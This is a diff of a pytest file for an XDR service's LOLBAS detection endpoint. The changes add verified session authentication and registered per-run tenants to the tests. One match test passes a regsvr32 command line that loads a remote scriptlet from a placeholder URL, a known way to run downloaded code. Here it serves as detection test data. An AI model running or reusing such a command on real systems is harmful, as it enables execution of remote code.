@@ -9,6 +9,8 @@ from __future__ import annotations
 import os
 from pathlib import Path
 
+import uuid
+
 import pytest
 from fastapi.testclient import TestClient
 
@@ -21,25 +23,39 @@ from routers import xdr_audit_log as al
 from routers import xdr_lolbas as lb
 from server import app
 
+from tests._verified_session import admin_token, hdrs, register_tenants
+
+#: MODERNIZED 2026-06 · this suite asserted its own identity with
+#: `X-Principal-Id`, which the platform deleted (P0-SEC), so every call was
+#: correctly refused as `unauthenticated`. It now authenticates. Nothing was
+#: relaxed server-side.
 client = TestClient(app)
 
-TEN = "lolbas-test-tenant"
+TEN = f"lolbas-test-{uuid.uuid4().hex[:8]}"
+_TOKEN: list[str] = []
 
 
 def _hdrs(**extra):
-    h = {"X-Tenant-Id": TEN, "X-Principal-Id": "tester@nivxray",
-             "X-Principal-Kind": "user"}
-    h.update(extra); return h
+    """A verified session that NAMES the tenant it operates in."""
+    return hdrs(_TOKEN[0], TEN, **extra)
 
 
 @pytest.fixture(scope="module", autouse=True)
 def _clean_slate():
-    if lb._entries()    is not None: lb._entries().delete_many({})
-    if lb._primitives() is not None: lb._primitives().delete_many({})
-    if lb._versions()   is not None: lb._versions().delete_many({})
-    if al._get_coll()   is not None:
-        al._get_coll().delete_many({"tenant_id": TEN})
-    yield
+    # ONE context-managed client for the module: the lifespan must be live
+    # (config validation + database init) and two clients on two event loops
+    # produce cross-loop 500s rather than test failures.
+    global client
+    with TestClient(app) as c:
+        client = c
+        _TOKEN.append(admin_token(c))
+        register_tenants(TEN, label="lolbas")
+        if lb._entries()    is not None: lb._entries().delete_many({})
+        if lb._primitives() is not None: lb._primitives().delete_many({})
+        if lb._versions()   is not None: lb._versions().delete_many({})
+        if al._get_coll()   is not None:
+            al._get_coll().delete_many({"tenant_id": TEN})
+        yield
 
 
 def _skip_if_no_mongo():
@@ -350,9 +366,14 @@ def test_disable_entry_hides_from_match_for_tenant():
     hits = r.json()["data"]["hits"]
     assert not any(h["entry_name"] == name for h in hits), \
         "disabled entry must not appear in tenant matches"
-    # A different tenant STILL sees it.
+    # A different, REGISTERED tenant still sees it: a per-tenant disable is
+    # a tenant decision, not a content deletion. The second tenant is
+    # registered because tenancy is an administrative act — naming one in a
+    # header never creates it, and it never authenticates the caller either.
+    other = f"lolbas-other-{uuid.uuid4().hex[:8]}"
+    register_tenants(other, label="lolbas-other")
     r2 = client.post("/api/xdr/lolbas/match",
-                              headers={"X-Tenant-Id": "other-tenant"},
+                              headers=hdrs(_TOKEN[0], other),
                               json={"image": "regsvr32.exe",
                                         "command_line": "regsvr32.exe /s /u /i:http://x/y.sct scrobj.dll"})
     hits2 = r2.json()["data"]["hits"]
